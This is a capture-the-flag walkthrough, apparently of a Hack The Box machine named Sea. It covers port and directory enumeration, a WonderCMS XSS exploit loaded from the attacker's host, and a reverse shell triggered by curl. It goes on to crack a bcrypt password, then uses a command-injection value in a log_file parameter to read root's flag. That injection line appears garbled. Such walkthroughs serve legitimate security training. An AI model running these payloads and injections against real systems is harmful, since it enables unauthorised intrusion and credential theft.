Running initial Nmap scan to discover all open ports.
```shell-session
# nmap -T4 -p- 10.10.11.28 -oN nmap_all_ports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-14 11:29 IDT
Warning: 10.10.11.28 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.11.28
Host is up (0.14s latency).
Not shown: 65512 closed tcp ports (reset)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
1335/tcp  filtered digital-notary
2611/tcp  filtered lionhead
3084/tcp  filtered itm-mccs
5819/tcp  filtered unknown
17526/tcp filtered unknown
18019/tcp filtered unknown
19817/tcp filtered unknown
20336/tcp filtered unknown
29183/tcp filtered unknown
35804/tcp filtered unknown
36490/tcp filtered unknown
38058/tcp filtered unknown
40277/tcp filtered unknown
49295/tcp filtered unknown
49853/tcp filtered unknown
50579/tcp filtered unknown
50687/tcp filtered unknown
56614/tcp filtered unknown
56616/tcp filtered unknown
59222/tcp filtered unknown
59370/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 727.39 seconds
```

While the scan runs we visit the website, since the contact link direct us to sea.htb we add the domain to the hosts file.
![[Pasted image 20240814113217.png]]

Used the following list to generate a list of just port numbers separated by a comma.
```shell-session
# cat nmap_all_ports | grep /tcp | cut -d '/' -f1 | tr '\n' ',' | sed 's/,$/\n/'   
22,80,1335,2611,3084,5819,17526,18019,19817,20336,29183,35804,36490,38058,40277,49295,49853,50579,50687,56614,56616,59222,59370
```

Now running a version scan on the open ports.
```shell-session
# nmap -sV -sC -p 22,80,1335,2611,3084,5819,17526,18019,19817,20336,29183,35804,36490,38058,40277,49295,49853,50579,50687,56614,56616,59222,59370 10.10.11.28 -oN nmap_open_ports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-14 11:57 IDT
Nmap scan report for sea.htb (10.10.11.28)
Host is up (0.14s latency).

PORT      STATE  SERVICE        VERSION
22/tcp    open   ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
|_  256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
80/tcp    open   http           Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Sea - Home
|_http-server-header: Apache/2.4.41 (Ubuntu)
1335/tcp  closed digital-notary
2611/tcp  closed lionhead
3084/tcp  closed itm-mccs
5819/tcp  closed unknown
17526/tcp closed unknown
18019/tcp closed unknown
19817/tcp closed unknown
20336/tcp closed unknown
29183/tcp closed unknown
35804/tcp closed unknown
36490/tcp closed unknown
38058/tcp closed unknown
40277/tcp closed unknown
49295/tcp closed unknown
49853/tcp closed unknown
50579/tcp closed unknown
50687/tcp closed unknown
56614/tcp closed unknown
56616/tcp closed unknown
59222/tcp closed unknown
59370/tcp closed unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.78 seconds
```

Looking for sub directories, we found some.
```shell-session
# gobuster dir -u http://sea.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x .php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://sea.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 3650]
/.php                 (Status: 403) [Size: 199]
/contact.php          (Status: 200) [Size: 2731]
/home                 (Status: 200) [Size: 3650]
/0                    (Status: 200) [Size: 3650]
/themes               (Status: 301) [Size: 230] [--> http://sea.htb/themes/]
/data                 (Status: 301) [Size: 228] [--> http://sea.htb/data/]
/plugins              (Status: 301) [Size: 231] [--> http://sea.htb/plugins/]
/messages             (Status: 301) [Size: 232] [--> http://sea.htb/messages/]
/404                  (Status: 200) [Size: 3341]
```

When searching for subdirectories of the subdirectories, bike is particularly interesting.
```shell-session
# gobuster dir -u http://sea.htb/themes/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x .php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://sea.htb/themes/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 199]
/home                 (Status: 200) [Size: 3650]
/404                  (Status: 200) [Size: 3341]
/372.php              (Status: 500) [Size: 0]
/%20.php              (Status: 403) [Size: 199]
/%20                  (Status: 403) [Size: 199]
/bike                 (Status: 301) [Size: 235] [--> http://sea.htb/themes/bike/]
```

Visiting README.md downloads for us an interesting file.
```shell-session
# cat README.md            
# WonderCMS bike theme

## Description
Includes animations.

## Author: turboblack

## Preview
![Theme preview](/preview.jpg)

## How to use
1. Login to your WonderCMS website.
2. Click "Settings" and click "Themes".
3. Find theme in the list and click "install".
4. In the "General" tab, select theme to activate it.
```

The site is seems to be WonderCMS website, a public exploit can be found [here](https://gist.github.com/prodigiousMind/fc69a79629c4ba9ee88a7ad526043413).

Executing the exploit it starts a python server.
```shell-session
# python3 WonderCMS_exploit.py http://sea.htb 10.10.14.59 6666
[+] xss.js is created
[+] execute the below command in another terminal

----------------------------
nc -lvp 6666
----------------------------

send the below link to admin:

----------------------------
http://sea.htb"></form><script+src="http://10.10.14.59:8000/xss.js"></script><form+action="
----------------------------


starting HTTP server to allow the access to xss.js
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Next we should use the xss payload on the victim.
![[Pasted image 20240814145555.png]]

Next we start a netcat listener.
```shell-session
# nc -nlvp 6666
listening on [any] 6666 ...
```

Then we activate the reverse shell.
```shell-session
# curl 'http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.14.59&lport=6666'
```

Finally we get a shell.
```shell-session
# nc -nlvp 6666
listening on [any] 6666 ...
connect to [10.10.14.59] from (UNKNOWN) [10.10.11.28] 39350
Linux sea 5.4.0-190-generic #210-Ubuntu SMP Fri Jul 5 17:03:38 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 11:53:43 up  1:50,  3 users,  load average: 0.88, 0.95, 1.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

We then upgraded the shell to be fully interactive.
```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@sea:/$ ^Z
zsh: suspended  nc -nlvp 6666
                                                                                              
┌──(root㉿kali)-[~/…/Labs/Machines/Easy/Sea]
└─# stty raw -echo;fg
[1]  + continued  nc -nlvp 6666

www-data@sea:/$ export TERM=xterm-256color
www-data@sea:/$ stty rows 21 columns 94
www-data@sea:/$
```

Looking at the database file we have a password.
```shell-session
www-data@sea:/var/www/sea/data$ cat database.js
{
    "config": {
        "siteTitle": "Sea",
        "theme": "bike",
        "defaultPage": "home",
        "login": "loginURL",
        "forceLogout": false,
        "forceHttps": false,
        "saveChangesPopup": false,
        "password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",
        "lastLogins": {
            "2024\/08\/14 12:41:07": "127.0.0.1",
            "2024\/08\/14 12:40:57": "127.0.0.1",
            "2024\/08\/14 12:40:26": "127.0.0.1",
            "2024\/08\/14 12:39:56": "127.0.0.1",
            "2024\/08\/14 12:39:47": "127.0.0.1"
        },
<SNIP>
```

Let's try to crack it with hashcat.
```shell-session
# hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

<SNIP>

$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:mychemicalromance
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM...DnXm4q
Time.Started.....: Wed Aug 14 15:53:30 2024 (1 min, 17 secs)
Time.Estimated...: Wed Aug 14 15:54:47 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       40 H/s (5.59ms) @ Accel:2 Loops:64 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 3060/14344385 (0.02%)
Rejected.........: 0/3060 (0.00%)
Restore.Point....: 3056/14344385 (0.02%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:960-1024
Candidate.Engine.: Device Generator
Candidates.#1....: 753159 -> memories
Hardware.Mon.#1..: Util: 30%

Started: Wed Aug 14 15:52:40 2024
Stopped: Wed Aug 14 15:54:49 2024
```

We gat the password `mychemicalromance`.

Successfully logged in as amay.
```shell-session
www-data@sea:/home/amay$ su amay
Password: 
amay@sea:~$
```

We can now get the user flag.
```shell-session
amay@sea:~$ cat user.txt
a9f9f30f76cf2497545250281a4ade30
```

Using SSH we can connect to the local host on the target machine.
```shell-session
# ssh -L 8083:localhost:8080 amay@sea.htb
```

Accessing the application at localhost:8083, we can watch the logs.
![[Pasted image 20240815123100.png]]

Changing the log_file argument to the following, revealed the flag.
```
log_file=/root/root.txt;cp/dev/shm/sudoers> /etc/suoderskanalyze_log
```

![[Pasted image 20240815123308.png]]

```
09be732ef14e53e8672eee6d4d58bb8d
```